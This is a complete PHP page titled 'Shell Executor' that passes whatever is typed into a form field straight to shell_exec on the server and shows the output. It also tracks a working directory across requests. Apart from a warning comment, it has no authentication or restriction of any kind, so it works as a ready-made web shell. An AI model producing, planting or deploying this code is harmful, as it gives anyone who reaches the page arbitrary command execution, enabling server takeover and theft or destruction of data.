<?php
// WARNING: This script is unsafe and should only be used in a secure, controlled environment.

session_start();

// Initialize or retrieve the current working directory
if (!isset($_SESSION['cwd']) || empty($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd();  // Default to the current directory of the PHP script
}

$output = "";
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the command from the form submission
    $command = $_POST['command'];

    // Change to the stored directory
    chdir($_SESSION['cwd']);

    // Handle 'cd' separately
    if (strpos($command, 'cd') === 0) {
        // Extract the directory part
        $dir = trim(substr($command, 2));

        // Change the directory
        if (@chdir($dir)) {
            $_SESSION['cwd'] = getcwd();
        } else {
            $output = "cd: The directory does not exist";
        }
    } else {
        // Execute other commands
        $output = shell_exec($command . ' 2>&1');  // Redirecting stderr to stdout
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Shell Executor with 'cd' Support</title>
</head>
<body>
    <h2>Execute Shell Command</h2>
    <form method="post">
        <input type="text" name="command" id="command" size="50">
        <input type="submit" value="Execute">
    </form>
    <pre><?php echo htmlspecialchars($output); ?></pre>
</body>
</html>
